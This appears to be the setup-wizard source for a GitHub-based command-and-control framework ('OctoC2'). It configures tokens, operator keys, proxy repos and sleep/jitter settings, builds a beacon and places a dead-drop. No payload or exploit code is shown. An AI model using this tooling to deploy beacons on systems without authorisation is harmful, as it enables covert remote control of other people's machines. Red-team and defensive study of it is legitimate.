import {
  phaseCredentials,
  phaseValidate,
  phaseKeygen,
  phaseAuthMode,
  phaseTentacles,
  phaseAdvanced,
  phaseWriteEnv,
  phaseBuildBeacon,
  phaseDeadDrop,
  phaseInstall,
  phaseVerify,
  type SetupState,
} from "./setup/phases.ts";
import { wizardIntro, wizardOutro, promptSelect, promptText, promptConfirm } from "./setup/prompts.ts";
import { loadEnvFile } from "./service.ts";
import * as p from "@clack/prompts";

const DIM   = "\x1b[2m";
const RESET = "\x1b[0m";

export interface SetupOptions {
  phase?: string;
}

/**
 * Load an existing .env and build a partial SetupState from it.
 * Missing fields stay undefined — the wizard will prompt for them.
 */
function stateFromEnv(vars: Record<string, string>): Partial<SetupState> {
  return {
    token: vars["OCTOC2_GITHUB_TOKEN"],
    owner: vars["OCTOC2_REPO_OWNER"],
    repo: vars["OCTOC2_REPO_NAME"],
    operatorSecret: vars["OCTOC2_OPERATOR_SECRET"],
    operatorPublicKey: vars["MONITORING_PUBKEY"],
    authMode: vars["SVC_APP_ID"] ? "app" : "pat",
    appId: vars["SVC_APP_ID"] ? parseInt(vars["SVC_APP_ID"], 10) : undefined,
    installationId: vars["SVC_INSTALLATION_ID"] ? parseInt(vars["SVC_INSTALLATION_ID"], 10) : undefined,
    tentaclePriority: vars["SVC_TENTACLE_PRIORITY"],
    proxyRepos: vars["SVC_PROXY_REPOS"],
    codespaceName: vars["SVC_GRPC_CODESPACE_NAME"],
    githubUser: vars["SVC_GITHUB_USER"],
    grpcPort: vars["SVC_GRPC_PORT"],
    httpUrl: vars["SVC_HTTP_URL"],
    sleepSeconds: vars["SVC_SLEEP"] ? parseInt(vars["SVC_SLEEP"], 10) : undefined,
    jitter: vars["SVC_JITTER"] ? parseFloat(vars["SVC_JITTER"]) : undefined,
    cleanupDays: vars["SVC_CLEANUP_DAYS"] ? parseInt(vars["SVC_CLEANUP_DAYS"], 10) : undefined,
    logLevel: vars["OCTOC2_LOG_LEVEL"],
  };
}

export async function runSetup(opts: SetupOptions): Promise<void> {
  wizardIntro();

  // ── Choose mode: fresh setup or import existing .env ─────────────────────
  const mode = await promptSelect<"fresh" | "import">({
    message: "How would you like to set up?",
    options: [
      { value: "fresh", label: "Guided setup", hint: "walk through all configuration from scratch" },
      { value: "import", label: "Import existing .env", hint: "load credentials from an existing file, then build/install" },
    ],
  });

  let state: SetupState;

  if (mode === "import") {
    const { resolve } = await import("node:path");
    const defaultPath = resolve(process.cwd().replace(/\/octoctl$/, ""), ".env");

    const envPath = await promptText({
      message: "Path to existing .env file",
      initialValue: defaultPath,
      placeholder: defaultPath,
      validate: (v) => {
        const { existsSync } = require("node:fs");
        if (!existsSync(v.trim())) return "File not found";
      },
    });

    const vars = loadEnvFile(envPath.trim());
    const partial = stateFromEnv(vars);

    // Validate required fields
    if (!partial.token || !partial.owner || !partial.repo) {
      p.log.error("Missing required fields: OCTOC2_GITHUB_TOKEN, OCTOC2_REPO_OWNER, OCTOC2_REPO_NAME");
      p.log.info(`${DIM}Falling back to guided setup…${RESET}`);
      return runSetup({ ...opts }); // restart as fresh
    }

    if (!partial.operatorSecret) {
      p.log.warn("No OCTOC2_OPERATOR_SECRET found — will generate a new keypair");
      const keys = await phaseKeygen(partial.token, partial.owner, partial.repo);
      partial.operatorSecret = keys.operatorSecret;
      partial.operatorPublicKey = keys.operatorPublicKey;
    }

    state = {
      token: partial.token!,
      owner: partial.owner!,
      repo: partial.repo!,
      operatorSecret: partial.operatorSecret!,
      operatorPublicKey: partial.operatorPublicKey ?? "(from env)",
      authMode: partial.authMode ?? "pat",
      appId: partial.appId,
      installationId: partial.installationId,
      tentaclePriority: partial.tentaclePriority,
      proxyRepos: partial.proxyRepos,
      codespaceName: partial.codespaceName,
      githubUser: partial.githubUser,
      grpcPort: partial.grpcPort,
      httpUrl: partial.httpUrl,
      sleepSeconds: partial.sleepSeconds,
      jitter: partial.jitter,
      cleanupDays: partial.cleanupDays,
      logLevel: partial.logLevel,
      envPath: envPath.trim(),
    };

    p.log.success(`Loaded ${Object.keys(vars).length} variables from ${envPath.trim()}`);

    // Skip straight to build/install/verify
    const beaconId = await phaseBuildBeacon(state);
    await phaseDeadDrop(state, beaconId);
    await phaseInstall();
    await phaseVerify(state);
    wizardOutro("Setup complete.");
    return;
  }

  // ── Fresh guided setup ───────────────────────────────────────────────────

  // Phase 1: Credentials (with retry loop)
  let creds: { token: string; owner: string; repo: string };
  while (true) {
    creds = await phaseCredentials();
    try {
      // Phase 2: Validate
      await phaseValidate(creds.token, creds.owner, creds.repo);
      break;
    } catch (err) {
      if ((err as Error).message === "RETRY_CREDENTIALS") continue;
      throw err;
    }
  }

  // Phase 3: Keygen
  const keys = await phaseKeygen(creds.token, creds.owner, creds.repo);

  // Phase 4: Auth mode
  const auth = await phaseAuthMode();

  // Phase 5: Tentacle priority
  const tentaclePriority = await phaseTentacles();

  // Phase 6: Advanced config
  const advanced = await phaseAdvanced();

  // Assemble state
  state = {
    ...creds,
    ...keys,
    ...auth,
    tentaclePriority,
    ...advanced,
  };

  // Phase 7: Write .env
  state.envPath = await phaseWriteEnv(state);

  // Phase 8: Build beacon
  const beaconId = await phaseBuildBeacon(state);

  // Phase 8b: Dead-drop (App auth only)
  await phaseDeadDrop(state, beaconId);

  // Phase 9: Install to PATH
  await phaseInstall();

  // Phase 10: Next steps
  await phaseVerify(state);

  wizardOutro("Setup complete.");
}
